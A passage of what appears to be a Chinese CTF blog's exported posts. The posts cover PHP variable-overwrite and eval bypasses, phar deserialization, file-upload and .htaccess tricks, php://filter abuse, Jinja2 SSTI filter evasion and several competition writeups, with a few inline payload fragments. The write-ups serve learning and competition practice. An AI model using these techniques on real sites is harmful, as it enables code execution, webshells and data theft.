对于变量覆盖，一般都会有下面可能的格式： for example: 解释一下： 对于get传参的key和value，如果key = error，直接结束，否则 $$key=== $$value 我们知道变量名是$开头的，那我们如果给变量名赋值的话，比如$key=a，此时$$key中的$key会变成a，其实后面就会变成$a 就是利用这个特性，导致原有的变量被后来的变量覆盖 die()结束进程，然后输出$error/$suces的结果 利用变量覆盖将flag赋值给$error或者$suces，然后利用die将其带出即可，当然，我们是可以引入其他变量的 通过$error带出： 通过$suces带出： 这里比较麻烦，需要绕过!($_POST['flag']==$flag) 但是我们可以一举两得： 既将flag的原有变量设置为了null 又没有POST（视作null） 此时就能从suces输出flag 实际题目当中当然使用error，想的又快 ereg() 废弃函数ereg()，搜索字符串以匹配模式中给出的正则表达式 ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字 母的字符是大小写敏感的。 ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配 该函数可以使用%00截断绕过： Exception异常处理类 同样和ReflectionClass差不多 通过ExceptionClass进行命令执行： 没什么好说的，直接用就是了： 因为new $v1()是新建一个类，这里创建一个异常类从而进行命令执行获得flag 不用管那个空括号，照样能执行(注释掉了) 与ReflectionClass比较相似： 原生类FilesystemIterator 利用FilesystemIterator可以获取指定目录下的所有文件，例如： 常与getcwd()配合 getcwd(): 获取并返回当前工作目录 原生类DirectoryIterator 同样的，可以使用DirectoryIterator列出所有的文件名(参考上面的poc) 常与glob伪协议搭配使用 原生类GlobIterator 与glob类似的迭代文件系统 原生类SplFileObject 可以读取文件： 直接打文件名即可，也可以配合php伪协议进行使用： $GLOBALS超全局变量 payload: 将v1覆盖成GLOBALS直接获取全部变量 get_defined_vars() get_defined_vars()返回由所有已定义变量所组成的数据 变量名 PHP的变量名只能包含数字、字母、下划线 并且只能够以字母、下划线开头 如果出现.、空格、+、[，则会将不合法的这些符号转换为_ 但是呢，如果先出现[，则会将[替换为_，但是对后续的不合法变量则不会再做处理： trim + is_numeric 通过trim去除字符串首尾的空白字符： 例如: 防止利用%0a等操作绕过is_numeric，利用trim除去空格 此时可以做一个测试，检测哪些ASCII字符可以绕过这个限制： %0c可以绕过 $_SERVER[‘argv’] 对于$_SERVER['argv']有： 例如： 利用eval将$fl0g等于flag_give_me即可: $_SERVER[‘REQUEST_URI’] 上文说过： 利用url编码绕过即可： 可以利用这个特性绕过一些$_SERVER['REQUEST_URI']的检测 $_SERVER[‘PHP_SELF’] 配合basename使用： 例如： 利用： assert() assert()断言 assert和eval都可以把字符串当作php代码执行 gettext() 启动： 需要查看php拓展是否有php_gettext()，然后在php.ini中查找;extension=php_gettext.dll，去除注释并重启 开启gettext()后，会将_()等效于gettext() 而gettext()相当于获取字符串： 例如： 利用gettext进行call_user_func(call_user_func($f1,$f2));构造 shell_exec()套娃命令执行 由于shell_exec()没有回显，可以使用如下几个方法： 可以使用curl带出： 利用Burp Collabrator client创建一个临时域名： 写文件 将内容写入到一个新的文件中，读取这个文件即可： parse_str()和extract() 利用parse_str()把查询字符串解析到变量中： 例如parse_str($_SERVER['QUERY_STRING']); 传入?_POST[key1]=123后 经过parse_str(): 会变成$_POST[key1]=123 再经过extract(POST)后，会变成‘_POST)后，会变成`P​OST)后，会变成‘key1=123` extract($_POST) 能够将POST传入的变量覆盖掉，甚至能够用于一些登录的情况： 例如下面这个代码： 这里如果利用POST传参： 就能够将$u的值修改为admin eval(“return”)类问题 对于这类问题，需要我们绕过return 如果我们直接： 会发现无法执行phpinfo(); 但是php中数字可以与命令进行一些运算 例如1-phpinfo();是可以执行phpinfo();命令的 同理，在三变量中，1-phpinfo()-1也是可以执行phpinfo()的 只需令v1=v2=1，v3=-phpinfo()-即可 将v3改变成任意命令都可以 同理，不只是加减，乘除也是能够构造出phpinfo()的: 1*phpinfo()*1也能够构造出 另外一个方法就是利用三目运算符： eval(&quot;return 1?phpinfo():1&quot;); 还可以利用： eval(&quot;return 1==phpinfo()||1&quot;); create_function命令注入 这里的$ctfshow('', $_GET['show']);就是关键点 可以利用create_function()来处理，因为create_function是需要传递两个参数的： 具体的原理可以参考Code Breaking 挑战赛 Writeup (seebug.org) 大概是在PHP的命名空间默认为\\，所有的函数和类都在\\这个命名空间中，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\\function_name() 这样调用函数，则其实是写了一个绝对路径。如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。 利用： 文件竞争/条件竞争 常见于利用session的文件包含 利用post过去的session会上传到tmp/sess_sessid文件里，包含并且执行里面的命令，但是又会因为会立马被删除，所以需要进行一个包含与删除之间的竞争 basename php中basename的用法： path：必需。规定要检查的路径 suffix：可选。规定文件拓展名。如果文件有改suffix，则不会输出这个拓展名 例如： 绕过方式： 也就是说test.php/%88 =&gt; test.php 取地址问题 有的时候需要你输入的一个字符串与随机生成的一个字符串相等时，如果发现爆破十分困难，不妨试试让他们的地址相等： 这里能够碰撞相等的概率非常之低，我们可以利用&amp;： 这样就能使它们两个相等了 数组弱比较 最近看到的trick，来看看它的破解方法： 这里利用数组弱相等特性：(我也是第一次知道) 构造的顺序反过来即可： 经过测试，可以任意打乱其数组构造的顺序，但是必须保证： 由此还能构造很多的payload，例如： array_search array_search()函数的语法如下： 其中，$needle表示要查找的值，$haystack表示要搜索的数组，$strict表示是否使用严格比较（可选参数，默认为false）。 严格比较就是默认为==型比较： 利用： intval后arr4y[0]变成了0 0弱比较NSS为true，返回第一个元素下标0 PHP8匿名类 匿名类可以创建一次性的简单对象： 其类名和行数、列数有关，所以实际情况直接复制php源码到在线运行网站跑一遍具体分析即可 因此，同一个位置出来的类称为同一个类。这个变量不受unset的影响，仍可直接通过类名直接调用： 如上图，由于$a在第二行，所以其get_class为： 对照一下可以得到： 即使变量被删除了也可以调用(变量的%00在php里的话要改成\\x00) stdClass内置类的妙用 来自Aecous师傅的文章，膜！ php反序列化小记(1)里提及了这个trick 当没有能够获取到反序列化类的对象时，就可以利用stdClass： 例如： 可以发现invoker后面的a只存在于A类，c只存在于B类，只能够指定一个invoker，乍看下不可能达成 但是实际上可以通过stdClass： __unserialize魔术方法 比较抽象，在php7.4以上时与wakeup在一起的话会忽略wakeup触发__unserialize 但是重点不是这个，重点是要想触发时，之前预设好的变量必须置为空 Error报错的妙用 某题 利用方式：new Error(xxx)-&gt;getMessage() 这样能够带出xxx payload： "},{"title":"Phar反序列化","date":"2023-10-31T10:46:27.000Z","url":"/posts/42785.html","tags":[["基础漏洞","/tags/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/"]],"categories":[["基础漏洞","/categories/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/"]],"content":"有关（Phar）反序列化的内容 Phar phar本质上是一个压缩文件，会以序列化的形式存储用户自定义的meta-data，当受影响的文件操作函数调用phar文件时，会自动反序列化meta-data的内容 Phar调用： Phar文件结构： 可以利用Phar反序列化的操作函数有： phar反序列化利用条件： phar文件要能够上传到服务器端 要有可用的魔术方法作为跳板（pop链） 文件操作函数的参数可控，且:、\\、phar等特殊字符未被过滤 生成phar包： 例如： zip包： tar包： gzip: bzip2: 过滤 有时候phar会过滤文件头，也就是HALT那行 这个时候就需要利用脚本重新生成签名： 脚本： Phar脏数据处理 例如一个例子： 分析一下： 接受并且设置filename 和 endcontent参数 判断是否存在一个filename的dir，不存在就创建 然后向该文件写入内容 对象销毁时再调用一次destruct，写入endContent 新创建一个Logger的对象，然后向log/info写入username 这里很明显有个利用方式：将endContent写成php木马，将filename写成shell.php，利用Logger这个类写入即可 利用file_exists触发phar 此时你会发现一个问题： 你直接写入phar时(假设phar内容用A来代替)，内容会变成： 其中$time是上面随机生成的时间戳 很明显如果直接执行的phar://log/info.log肯定不行，毕竟phar数据流已经被“前后夹击”，都是脏数据 那接下来我们就需要绕过这些脏数据： 绕过Phar头的脏数据 绕过头的很简单，还记得phar是如何生成的吗？ 我们可以利用setStub添加文件头 那可以想想，如果前面的脏数据本来就是我们phar文件的一部分呢？ 那是不是前面的脏数据就不是问题了，例如在这里，前面的脏数据是： 那我们写phar的时候可以这么设置 这个时候就将脏数据也纳入了phar的一部分了 此时只需要截取phar不包含脏数据头的部分写入，就是一个合法的phar文件 绕过Phar尾部的脏数据 这里就需要利用tar文件来绕过了，我们可以利用convertToExecutable函数将phar文件转换成其他格式的文件。 如果以tar文件储存phar，则会使得它不受后面数据的影响 phar各种格式的转换： 总体的exp如下： 此时获得了phar的数据流，假设记为B： 此时我们只需要 一些php反序列化的tricks 绕过wakeup 老生常谈的绕过wakeup 可以看看大师傅的博客 php反序列化之绕过wakeup – View of Thai 当然也可以直接利用cve-2016-7124(就是最常用的绕过destruct方法) 绕过throw Error异常抛出 利用gc垃圾回收机制，gc又叫garbage collection，在php中使用引用奇数和回收周期来自动管理内容 当一些数据或者变量在进行某些操作后被置为空(null)或者是没有地址的指向时，一旦这些数据被回收，就相当于给一个程序的结尾划上了句号，那么久不会出现无法调用__destruct方法了 利用 这里需要引入null，此时反序列化中的结果有两个，一个是i=0，另一个是i=1，此时i=1为null，i=0为我们的对象，如果将i=1修改成i=0，就可以将i=0指向null，实现gc回收 绕过一些正则匹配表达式 反序列化中，以下两个payload等价： 利用十六进制绕过即可 比如说： 绕过 此时就可以利用 绕过一些[Oa]:[\\d]+ 例如： 利用方式： 如果能用+的话直接用加号隔断 换别的方法： "},{"title":"文件上传","date":"2023-10-31T10:43:58.000Z","url":"/posts/11796.html","tags":[["基础漏洞","/tags/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/"]],"categories":[["基础漏洞","/categories/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/"]],"content":"有关php文件上传的一些特性 文件上传表单的构建 有时候题目需要你自己构造表单时，如何构建呢？ 比较常见的表单构造如下： 带账户密码的传输 平时我们上传到linux的文件会先保存在/tmp/phpxxxxxx处 其中xxxxxx是六个随机字符(英文+数字) 然后会被立刻删除 更加详细的信息可以看到，假如我上传了一个图片叫02.jpg： 文件上传漏洞其实是由于疏忽导致恶意木马能够上传，然后为我们所用( 文件上传绕过 前端校验 过滤写在前端的时候，恰好可以用ctfshow文件上传上的一句话：前台校验不可靠 绕过方法： 将js禁用 f12修改前端js 先通过上传合法的内容，然后将其抓包，改成恶意内容即可 MIME-TYPE: 什么是MIME-TYPE： 上文讲到，文件上传时候的一些参数： 其中[&quot;type&quot;] =&gt; &quot;image/jpeg&quot;就是MIME-TYPE 此时我们只需要抓包修改上传文件时的Content-Type即可 后端黑名单 大小写绕过 例如in_array函数(该函数区分大小写)，如果利用in_array作为黑名单时，能够利用大小写绕过： 不同后缀绕过 同样地，各种php后缀都是能够解析的： php2 php3 php4 php5 pht phtml phps … 利用.htaccess限制用户文件后缀的示例： 大概意思是如果匹配到文件后缀，应用Deny阻止用户的所有访问 文件内容绕过 首先可以尝试大小写绕过 各种短标签： &lt;??&gt;，等价于&lt;?php?&gt;，前提条件是short_open_tag = On &lt;?=?&gt;，等价于&lt;?php echo?&gt; &lt;%%&gt;，等价于&lt;?php?&gt;，前提条件是asp_tags = On，同时PHP版本&lt;7.0 &lt;script language = &quot;php&quot;&gt;&lt;/script&gt;或者&lt;script language = &quot;php&quot;&gt;，等价于&lt;?php?&gt;，前提条件是PHP版本&lt;7.0 .htaccess .htaccess是一个用于运行Apache网络服务器软件的网络服务器上的配置文件 .htaccess中拥有#作为单行注释符，同时支持\\拼接上下两行 .htaccess会被Apache Web服务器检测并执行，以启用/禁用Apache Web服务器软件所提供的额外功能以及特性 利用方式： 自定义出错界面进行盲注 可以通过.htaccess创建自定义的出错页面： 原理： 假设flag是flag&#123;testflag&#125;(波浪符号代表其开启了正则匹配) 通过不断变换a到t时，页面就会返回错误信息，也就是有any Error Content出现 利用这一点可以对flag的内容进行盲注，这一点在津门杯2021的uploadhub上出现过，这是来自Nu1l战队wupco师傅的解法： 强制处理 通过SetHandler或者ForceType强制所有被匹配到的文件用指定的处理器处理： 强制当前目录下的所有文件用php进行解析 添加处理器 修改php_value 当使用PHP作为Apache的模块时，也可以利用Apache的配置文件(例如http.conf)和.htaccess来修改php的配置设定 前提： 需要有AllowOverride Options 或者 AllowOverride All权限 要清除php_value原先设定的值，可以将value设置为none 如果要设置布尔值，需要使用php_flag 利用方式： 当然，还可以利用.htaccess来包含/tmp下的文件： 通过设置回溯限制来绕过preg_match： 设置回溯次数为0，使得正则匹配的返回结果为0，绕过正则 修改php_flag 可以利用php_flag修改engine为0，在本目录和子目录中关闭php解析，造成源码泄露 本地文件包含 在当前目录下php文件头引入/etc/passwd 修改include路径 .htaccess可以设置include_path将include()的默认路径改变： 远程文件包含 前提需要开启PHP的all_url_include选项，由于all_url_include的配置范围为PHP_INI_SYSTEM，所以无法利用php_flag设置all_url_include 伪协议包含 前提条件： all_url_fopen、all_url_include设置为On 让自身作为php文件处理 当前目录下有php文件时，利用auto_append_file包含自己即可： 先前说过.htaccess中#作为单行注释符，而\\可以作为换行连接上下两行 所以如果有过滤时： 当前目录下没有php文件时 将自身指定成php文件，利用SetHandler 比较经典的.htaccess使用 配合一句话木马，使其作为php解析： 或者直接 cgi脚本执行 如果开启了cgi拓展(需要加载cgi_module，也就是.conf文件中有 LoadModule cgi_module modules/mod_cgi.so) 写个.sh的 FastCgi执行 需要加载mod_fcgid.so 也就是 开启后，在.htaccess上写一个 传一个随意的.txt lua执行 新姿势，在2020年newupload中被使用 利用.htaccess将文件解析成.lua： 然后传一个1.lua： 自包含绕过&lt;? utf7编码可以利用下面方式得到： 利用报错日志写🐎 例如[XNUCA2019Qualifier]EasyPHP 这题对文件的内容和文件名做出了限制，同时在结尾添加了\\nJust one chance 这里可以利用.htaccess进行自包含： url编码后传进去即可 另一种解法是利用题目中preg_match(&quot;/[^a-z\\.]/&quot;, $filename) == 1，这里可以利用回溯限制绕过： 然后即可绕过preg_match，就可以利用php伪协议写shell： 当然，由于其包含了fl3g.php 如果我们修改include_path，就可以使得fl3g.php是任意目录下的某个文件 利用error_log可以控制fl3g.php的内容： 如果我们include_path修改后，include_once就会去include到这个不存在的文件夹，此时产生报错，报错内容写入了/tmp/fl3g.php内 这里的#\\是注释后面的脏数据 此时访问index.php后触发错误，将内容写入后再次修改.htaccess 此时再次访问index.php，便会包含/tmp下的已经写入的木马 传入1=whoami即可 绕过exif_imagetype()上传.htaccess 假设题目限制了上传文件的图片尺寸： 假设利用getimagesize()等函数检测上传图片的尺寸，并且使用exif_imagetype()检查图片类型，此时我们可以使用： 来绕过 源码泄露 前文说到，设置 engine值为0时会关闭源码解析，导致源码泄露： 反序列化触发 php文件中发生反序列化时触发 shtml 将.htaccess设置成利用shtml进行解析也可以进行rce: shell.shtml .user.ini inc 利用spl_autoload_register函数： 如果不指定处理用的函数，就会自动包含类名.php或者类名.inc的文件 绕过pathinfo 这个题在NSSCTF 2nd的php签到中出现过，是需要绕过pathinfo的 当然，upload labs的第20关也有利用到这个 这里利用了pathinfo获得文件的后缀名 但是pathinfo只会获取最后一个点之后的后缀名，如果利用/.就可以绕过pathinfo post传包： 记得要对/进行url编码再传入"},{"title":"php伪协议","date":"2023-10-31T10:43:51.000Z","url":"/posts/3072.html","tags":[["基础漏洞","/tags/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/"]],"categories":[["基础漏洞","/categories/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/"]],"content":"有关php伪协议的一些特性 php://filter read和write 读文件时触发read 写文件时触发write 向xxx写入base64解码的内容 同时，下面的写法也是合法的： 这说明伪协议不区分大小写 如果使用的不是read或者write，则会报错： 如果没有写，则会自动推导是write还是read： 可以使用多个过滤器： 绕过死亡exit 谈一谈php://filter的妙用 | 离别歌 (leavesongs.com) 这两种协议都会先对内容进行处理，再进行base64的解码 其实就是在解码的过程中，字符&lt;、?、;、&gt;、空格、单双引号等会被忽略 假如我有一个file_put_contents 此时它会把我们的恶意代码提前写入&lt;?php die(&quot;nononon&quot;);?&gt;，导致我们的恶意代码被提前结束 此时我们可以利用php伪协议的特性： 此时会向shell.php写入伪协议处理后的decode的内容 经过处理后就会变成phpdienononon加上我们的内容 此时由于base64解码是4字节一组的解码方式，我们需要在前面加上任意字符使得xxxphpdienononon刚好是四的倍数个长度 此时前面就会被解码成乱码，后面会被正常解码成我们的shell 其他的过滤器： convert.quoted-printable-encode 打印不可见字符 convert.iconv.utf-8.utf-16be uft8 -&gt; utf16 convert.iconv.utf8.utf-7(可去除等号) utf8 -&gt; utf7 convert.iconv.ASCII.UCS-2BEascii -&gt; UCS-2BE string.strip_tags 去除html和php的标签 … url编码 php会对过滤器decode多一次，所以可以用url编码绕过(?) "},{"title":"看看ssti","date":"2023-09-09T04:48:14.000Z","url":"/posts/42279.html","tags":[["Web","/tags/Web/"]],"categories":[["CTF","/categories/CTF/"]],"content":"整理一下有关服务端模板注入(server side template injection)的东西 开局一张经典老图，判断类型： Python的一些特性 在python中，有一些独特的特性： python中的类均继承于object基类 python中还有一系列的魔术方法，一些函数的实现也是通过直接调用魔术方法的，常用的魔术方法有: __init__: 构造函数，一般是接受类初始化的参数，并且进行一系列初始化的操作 __len__: 返回对象的长度 __str__: 返回对象的字符串表示 __getattr__: 对象是否含有某属性，等价于函数方法getattr(a, 'b')，相当于a.b __subclasses__: 返回当前类的所有子类，一般用于object类中，然后找到带有os的模块实现rce python的类中也有一些魔术属性： __dict__: 可以查看内部所有属性名和属性值组成的字典 __class__:返回当前对象所属的类，例如''.__class__会返回&lt;class 'str'&gt;。拿到类后就可以构造函数生成新的对象，如''.__class__(1234)等价于str(1234)，即'1234' __base__: 返回当前类的基类，例如str.__base__就会返回&lt;class 'str'&gt; 此外还有一些重要的函数： __mro__ 返回一个包含对象所继承的基类元组，按顺序解析 __globals__返回所有全局变量 __builtins__ 包含当前运行环境中默认的所有函数，如str、chr等，可以通过拿到__builtins__，然后__import__('os').system('')进行RCE 通过从变量 -&gt; 对象 -&gt; 基类 -&gt; 子类 -&gt; 全局变量的方式，就可以进行ssti 一般思路：寻找到object基类后，引入os._wrap_close，然后寻找popen即可进行 一些参数 payload jinja2 smarty smarty是一个基于PHP开发的php模板引擎，所以其payload与我们熟知的PHP命令执行十分相似： twig ssti绕过过滤 对于关键字过滤： 1、关键字的拼接 非常常见的方法，在python中ab是可以又'a'+'b'拼接而成的，也就是说：__class__ = '__cla'+'ss__' 例如： 但实际上在jinja2内，&quot;cla&quot;&quot;ss&quot;等同于&quot;class&quot; 2、关键字倒序输出、替换 简单地说就是类似于strrev()的操作，通过['__ssalc__'][::-1]输出__class__： 当然，倒序输出还可以使用reverse: 关键字替换： 3、ascii转换： 利用python的格式化字符串特性: 4、编码绕过 hex编码、unicode编码、以及八进制都可以，例如： 5、chr函数，前提是需要通过__builtins__找到chr函数： 6、jinja2内可以利用~进行拼接： 7、大小写转换 前提只是过滤小写： 8、attr 当然，前文已经讲过attr能够在同时过滤点号和中括号时使用了： 9、join 10、利用请求方式绕过： 例如过滤了__class__ 如果还过滤了 args，可以使用request['values']和attr结合绕过 绕过中括号： 获取单独字符： 1、利用string: 2、利用list配合pop 绕过config参数 适用于一些题目中将flag设置在config中的题： 如果题目有app.config['FLAG'] = os.environ.pop['FLAG']，我们可以直接访问&#123;&#123;config['FLAG']&#125;&#125;或者&#123;&#123;config.FLAG&#125;&#125;得到flag 但是如果过滤了config，我们可以利用self来间接得到config: 过滤下划线_ 利用编码绕过： 删除许多模块，但是没删除reload 仅适用于python2，通过reload恢复所有被删除的模块： 同时有大量过滤 例如过滤： 思想大体是利用没有过滤的模块(可能如lipsum)来构造基础payload 比如没过滤lipsum，就可以先构造出基础payload: 然后再考虑如何构造出关键字 这就要利用到上文的获取单独字符的方法和字符串拼接的方法join进行拼接 然后利用内置的&#123;%set%&#125; &#123;%print%&#125;进行变量设置和打印 逐步组装关键字 然后用print打印结果即可 详情可以看flask ssti的新姿势这篇文章 省流的话其实就是，利用&#123;%set one=dict(c=a)|join|count%&#125;获取到数字 利用pop方法获取到下划线： &#123;%set xiahuaxian=(lipsum|string|list)|attr(pop)(three*eight)%&#125; 再利用dict方法和join构造出__globals__ __builtins__等关键字 然后获取chr函数： lipsum.__globals__.get('__builtins__').get('chr') &#123;%set char=(lipsum|attr(globals))|attr(get)(builtins)|attr(get)(dict(chr=a)|join)%&#125; qwq ssti盲注 盲注的困难在于没有回显，所以我们需要利用python的time库来进行时间盲注： 首先要获取到time库： 获取到能够import的参数后，进行盲注： 不知为何用不了ascii和ord，只能做一点简单的情况分析了： 当页面传入\\、&quot;、'等特殊符号时都有可能会报错，所以这些要加上\\转义(popen内的内容任意修改即可)： 而且还有可能会多出一些东西，自己判断一下就好 四处收集的payload 某比赛利用request绕过 参考文章： 服务端模板注入(SSTI) | micgo’s blog Y4tacker - SSTI模板注入及绕过姿势 yu22x - SSTI模板注入绕过(进阶篇)"},{"title":"羊城杯的一些题解及体会","date":"2023-09-04T09:57:26.000Z","url":"/posts/10145.html","tags":[["Web","/tags/Web/"]],"categories":[["CTF","/categories/CTF/"]],"content":"打了羊城杯，自我感觉难的挺合理:( 不过我觉得了解到题目出/考的是什么才是重要的:( D0n’t pl4y g4m3!!! 一道考察php反序列化的题目，需要我们访问p0p.php，但是我们一旦访问/p0p.php就会把页面跳转至一个吃豆人游戏中 但是题目就是叫我们不要玩游戏的意思嘛 我开始还以为是什么js题，但是查遍了js，没有什么异常，才回去尝试抓包的 抓包以后发现啥也没有，这下这下了 但是它提示有个hint.zip 下载下来解压后的内容： … 那我只能说hint了个寂寞 没辙啊，p0p.php也不给源码 不过越是不给源码的说明越重要是吧，我们还是得像办法读出p0p.php的内容 注意到服务器的php版本是7.4.21 此时群里的师傅们也都说了7.4.21有这个漏洞： 只需要先关闭自动更新Content-Length，然后按如下图所示： 即可读到源码： 拉取到的p0p.php内容如下： 可以看到是一个php反序列化，而且还有waf 这个waf只会将关键字替换为空，所以我们可以进行双写绕过： syssystemtem只会将中间的system去掉，然后剩下的sys 和 tem 能够组成system 那我们来简单看下这个链子怎么触发吧 总结一下其实链子就是 这里先将exp给大家，然后说一下我先前不懂的点： 为什么name要设置成 name[finish] = &quot;a&quot;的形式 还有是为什么now[YCB1] = &quot;system&quot;的形式 先说说后面那个 如果调用__call()魔术方法的话，会传递两个参数 第一个参数就是我们调用的方法，这里是调用YCB1方法，所以传递了第一个参数叫YCB1 第二个参数就是我们调用到的方法传递的参数，比如这里的YCB1方法有两个参数： rce和rce1，那么这两个参数会一并传递过去，并作为数组存储 而这里call_user_func调用了call的两个参数： now[$name] 和ary[0] call传入的两个参数就叫name 和 ary 答案很明显了吧，name其实就是我们的YCB1方法，而ary数组内有2个元素，一个是rce，另一个是rce1，这里的ary[0]相当于rce 其实就是now[YCB1](rce) 我们将now设置为数组，且键名就叫YCB1，键值为system，其实就是system(rce) 再将rce设置为ls 就相当于执行system('ls'); 那另外一个的话我想大概也是如此，传入了一个finish参数，然后value其实就是finish 返回的是什么意思呢？是这样的： 那大概便是如此 将序列化结果进行双写即可（也就是把system改为syssystemtem） 但是ls /之后找不到flag。。。 cat /flag会显示flag不在这，笑死，找了个寂寞 这里通过find / 来读取所有文件，最终发现flag在/tmp/catcatflag.txt内： 最终payload： ez_java 不是很懂 java审计题，题目提供了附件： 简单地说就是/会显示Welcome to YCB /templating会对模板进行渲染(这里的模板是freemarker) /getflag会将传入的data参数进行base64解码，然后进行反序列化 其实这里还是不是很懂要怎么利用，毕竟自己的java还是太菜了 这里按照thai师傅的方法应该是调用： BadAttributeValueExpException -&gt; POJONODE#toString -&gt; HtmlInvocationHandler -&gt; htmlmap 利用poc: payload: 将payload发到getflag路由即可覆写index.ftl 将ftl覆写成可以利用freemarker ssti的形式，再访问template传入name: 执行反弹shell 关于反弹shell的操作这里也一直在踩坑，导致卡了很久，包括Serpent那题也是很晚才能够解出来 这里反弹shell必须要有一台公网vps，同时要在安全组内对需要监听的端口进行开放，不然请求就会被防火墙一直拦截 噗，下次就不要这么犯蠢了:( vps内: 然后发送请求： 即可获得flag ez_web 不会。。 一点头绪都没有 官方hint说访问cmd.php 访问后命令执行仅能执行whoami 还有另外一个是列目录，但是只能列ls、ls /、ls /etc、ls /etc/passwd 文件上传没看，大概也对文件进行了限制 总之就是很迷 不过结束后听师傅们说应该是通过文件上传so文件再用whoami触发…? 算了 看不懂 Serpent flask题 通过访问www.zip就可以获得源码： 访问/verification获取到session 如果session为admin，返回secret ey开头的session是flask的session 尝试使用flask session decoder: 他直接把secret_key给解出来了： 加密： 返回： 访问src0de即可获得源码： 这里就是pickle反序列化的点了： pickle是python中的一个能够序列化和反序列化对象的模块 上面是一个简单的pickle例子，dumps相当于序列化一个对象 而loads相当于反序列化一个对象 而pickle反序列化中还有一些opcode，例如一个比较经典的opcode： 但是在这里不行，它返回了No Way!!! 因为这里还有个check函数没有给出，相当于有waf的存在 慢慢测试发现waf拦截了R 所以我们需要一个不含R的opcode协助我们进行pickle反序列化： 这个时候返回了go for it 但是并没有whoami的回显，说明我们要进行无回显的pickle反序列化 这里还是通过反弹shell来执行： 打开2333的监听，将其使用cookie传递后成功反弹： 但是我们在cat /flag的时候显示了权限不足 由于服务器使用python 这里我们使用python提权： ArkNights 这题被狠狠的非预期了。。 这题提供了源码： 可以看到本意应该是什么呢？ 先看路由，read路由存在有任意文件读取，但是不能直接读取flag /里面能够通过exec进行命令执行，但是我们需要对session进行修改 这里就有点像蓝帽杯2022 file_session的味道了，毕竟在read路由内写的源码都十分地相似： secret_key肯定是存在内存内的，由于我们没有其他方法直接读取到secret_key 我们就需要间接从内存中获取，其secret_key是随机uuid，并将-替换为*，然后后面拼接上Boogipopisweak： 利用我们蓝帽杯里的方法，读取/proc/self/maps和proc/self/mem获取secretkey: 爆出key： 还要记得加上Boogipopisweak key: 验证： 伪造的时候还需要加上时间戳… 为什么呢？ 这就涉及到session的一些性质了，对于flask session加密的流程如下： 可以得到其时间戳 说明这个session是有时效性的 同样，我们使用蓝帽杯的脚本来对时间戳进行加密： 如果在正确的时间访问接口，会返回500，说明我们成功进入到exec 但是后面怎么绕exec就有些麻烦了 刚开始是想通过类似sql注入的方式闭合[]然后执行命令，但是发现过滤了[] 但是它还有一个非预期： ezyaml 涉及到yaml反序列化、tar包的extractall漏洞 源码如下： 路由： 这里就是通过/src路由并且提供name参数能够对yaml进行反序列化，然后对admin.html进行渲染并且返回 但是无论我们怎么上传tar包，我们都不能够访问到我们传入的yaml文件(返回500) 百思不得其解啊，看不懂要怎么触发 这时候还是得靠万能的博客，通过NSSCTF Round#6的一篇wp内，发现了对于tar包的extractall的漏洞： 其实这里是它引用的一篇博客：  通过这里面的poc直接运行即可 另外，关于yaml反序列化的一些payload： exp: 总结一下，感觉自己还是特别特别的菜。。 啥也不会的样子，pop链也得理解好久:( 不过我应该是有点进步了吧，起码是会那么一点点东西的:( 另：网络的力量真的非常的厉害"},{"title":"Inject Me 题解","date":"2023-08-26T01:40:04.000Z","url":"/posts/57648.html","tags":[["Web","/tags/Web/"]],"categories":[["CTF","/categories/CTF/"],["java","/categories/CTF/java/"]],"content":"一道来自CNSS Summer的java题 笨人也是最近才刚刚开始学习java，所以写得比较菜。而且说是题解，但是因为自己没有vps的原因，自己也做不完后面的内容 题目与靶机 题目提供了summer.jar附件，打开靶机页面显示404 Not Found 对于jar包，我们可以使用jadx对其进行反编译： 题目的提示为： XXE Revese Shell(反弹shell) 查看源代码 查看源代码： Controller 发现Controller有两个主要Controller: 分析下来CommandController其实是我们通过访问/cnss/doCmd?cmd=来进行命令执行 另外一个Controller: 该Controller包含两个路由： /cnss/summer/login: 通过Post方式传入loginParam内的东西，将其称为credentials Param 查看loginParam: 说明其实我们的POST参数名应该是us3rname和p@ssword 然后获取了一个uuid，设置session内的参数（比如username, timestamp, token），然后返回了一个token的md5值 /cnss/summer/parse: parse路由需要使用POST传入ParseParam的东西，将其称为payload，还需要使用get传入一个参数nammmmme 查看ParseParam: 说明我们需要请求的参数是username和xml 然后获取到session内我们先前login的username参数，并进行判断： 如果session内的username参数和我们的nammmmme不一致，或者是payload内传入的username参数与nammmmme不一致，就会返回错误 反而会进行一个xml的获取，我们结合题目的提示xxe可以猜测到我们可以在这里进行xxe的注入 实际上，对于SAXReader这个第三方库，是的确有存在xxe的风险的： 参考这篇文章： java xxe 再查看 然后回过头来，先前我们在CommandController内发现它从config处获取了blacklist，所以我们尝试去查找一个这个config Config 在config处我们发现了： CommandFilterConfig和ParseFilterConfig 其实就是用系统设置内获取allow和blacklist 同样地，获取参数并且设置 filter 我们还发现了一个重要的包：filter未查看，其实从包名应该可以猜出这是对我们访问时所作出的一些过滤限制 应该是对于请求/doCmd时做出的限制，其实就是查看请求的内容是否符合规范(?) 上一行当然是废话… 其实是对于访问地址做出的限制： 这里对于我们的/Parse做出限制： 系统设置 application.properties 其实就是application.properties 发现application.properties对server进行了一些限制： 服务器在本地的5000端口，请求方式为SUMMMMER 以及expire: 5000 在java时间戳（timestamp）当中应该是5秒钟的时间 还有command处，仅允许127.0.0.1访问才能够执行命令 而且还有黑名单限制，我们无法使用： 联系到反弹shell，我们可以猜测到通过反弹shell来获取到我们的flag 而且需要通过访问本地的服务才能进行命令的执行： xxe: 我们先前的xxe一直都是使用进行flag的读取，但其实xxe不仅仅只有这一个用途，它还有： SSRF 探测内网的信息 RCE 等 思路 在上文中我们得知/cnss/summer/parse可以进行xxe，但是有以下几个限制： 对于5秒钟的限制，我们仍有解决方法。解决的方法就是利用我们的python 对，写python脚本即可 由于只用考虑前4项一致，我们可以直接进行爆破即可 通过碰撞来获取我们需要的UUID，通常我们考虑的是数字的爆破即可 